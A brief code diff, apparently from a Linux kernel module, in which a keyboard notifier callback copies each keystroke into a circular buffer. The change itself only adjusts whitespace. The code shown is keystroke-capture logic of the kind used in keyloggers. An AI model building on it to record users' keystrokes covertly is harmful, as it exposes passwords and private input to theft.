@@ -188,6 +188,7 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
 			if(shiftPressed){
 				while(i < strlen(keysShift[param->value])){
 				    c = keysShift[param->value][i];
+					
 					i++;
 					*basePtr = c;
                     basePtr++;
@@ -206,7 +207,7 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
                         basePtr = keyBuffer;
                     }
                 }
-            }    
+            }
             up(&s);
         }
     }
